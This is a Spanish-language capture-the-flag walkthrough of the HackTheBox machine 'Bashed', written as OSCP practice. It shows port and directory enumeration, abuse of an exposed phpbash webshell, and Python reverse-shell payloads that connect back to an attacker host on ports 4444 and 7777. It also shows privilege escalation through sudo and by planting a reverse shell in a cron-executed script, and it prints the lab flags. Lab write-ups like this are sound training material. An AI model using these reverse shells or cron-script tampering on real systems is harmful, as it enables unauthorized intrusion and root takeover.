# 💻 Bashed

> 🔊 Plataforma: HackTheBox
>
> 🛡️ Nivel de dificultad: Fácil
>
> 💡 Preparación OSCP - **igneosec**

---

## 🗓️ Información general

- **Nombre de la máquina**: Bashed
- **Dirección IP**: 10.10.10.68
- **Sistema operativo**: Linux (Ubuntu)
- **Tipo de acceso / Vector de entrada**: Explotación de webshell `phpbash.php` encontrada en `/dev`

---

## 🔍 Enumeración

### 🔹 Escaneo de puertos

```bash
nmap -sS -n -p- --min-rate=5000 -oN firstscan --open -v 10.10.10.68 -Pn
```

> Puertos detectados:
> 
> - 80/tcp → HTTP (Apache 2.4.18)

---

### 🔹 Detección de versiones y servicios

```bash
nmap -sCV -p80 10.10.10.68 -oN targetedscan
```

> Resultados clave:
>
> - OS: Ubuntu
> - Servicio Web: Apache/2.4.18 (Ubuntu)
> - Título web: "Arrexel's Development Site"

---

## 🧐 Enumeración web

- Servicio HTTP activo → `http://10.10.10.68`
- `/about.html` y `/single.html` mencionan **phpbash**:

> "phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!"

- Esto nos indica que **phpbash** fue desarrollado en esta máquina y está presente.

Enumeración con `gobuster`:

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt -x html,phtml,php,txt -t 40 -o html-enum.txt
```

> Directorios interesantes:
> - `/dev/`
> - `/uploads/`, `/php/`, `/contact.html` (formulario que no tuvo efecto)

Navegando a `/dev/phpbash.php` descubrimos una **webshell interactiva** tipo terminal → acceso como `www-data`

Intentos fallidos:
- Reverse shell en `contact.html` (formulario) ❌
- `curl -T` para subida de archivos (método PUT no permitido) ❌

**Lección**: Siempre explorar a fondo los directorios detectados y leer el contenido de las páginas informativas.

---

## 🎯 Explotación

### 🔥 Shell inicial desde la webshell

Ya que `phpbash.php` permite ejecución de comandos, conseguimos una shell interactiva usando Python:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

En la máquina atacante:

```bash
nc -lvnp 4444
```

🔹 Acceso como `www-data` conseguido.

---

## 🡇 Escalada de privilegios

### 🔒 Enumeración de sudo

```bash
sudo -l
```

> El usuario `www-data` puede ejecutar comandos como `scriptmanager` sin contraseña

Cambio de usuario:

```bash
sudo -u scriptmanager /bin/bash -i
```

🔹 Nuevo contexto: `scriptmanager`

### 🔎 Búsqueda de archivos relevantes

```bash
find / -writable -user scriptmanager 2>/dev/null
```

> Archivo encontrado: `/scripts/test.py` ✅

---

## ⏳ Cronjob Abuse – Confirmación

Aunque se obtuvo acceso directo a `crontab`, deduje que el script `/scripts/test.py` era ejecutado periódicamente porque:

- Se encontraba editable por `scriptmanager`
- No existía otra razón para su ejecución
- Tras modificarlo con reverse shell, se ejecutó automáticamente ❀

> 💭 **Consejo OSCP**: Si ves un `.py`, `.sh` o similar que puedes modificar como usuario no privilegiado... prueba a insertar una shell inversa, podría tratarse de un cronjob.

---

## 🏳️ Root

Modificamos el archivo `/scripts/test.py` con el siguiente payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.9",7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

En la máquina atacante:

```bash
nc -lvnp 7777
```

🔹 Shell como `root` conseguida.

---

## 🌿 Flags encontradas

### ✅ Flag 1 (user.txt)

- **Ruta**: `/home/arrexel/user.txt`
- **Contenido**: `2c281f318555dccb39f6d9c2b44dbd4b`

### ✅ Flag 2 (root.txt)

- **Ruta**: `/root/root.txt`
- **Contenido**: `cc2f0a0ea8c4eaef5e621fd78f3e000b`

---

## 📙 Lecciones aprendidas

- 🔎 Revisar directorios poco comunes: `/dev/`, `/scripts/`
- 🚀 Usar Python para obtener shell inversa cuando sea posible
- ⌚ Detectar cronjobs si scripts se ejecutan automáticamente
- 🧠 No olvidar: los errores y caminos fallidos también enseñan

---

📄 Writeup realizado por **igneosec**

📊 Parte del laboratorio ofensivo: [https://github.com/igneosec](https://github.com/igneosec)
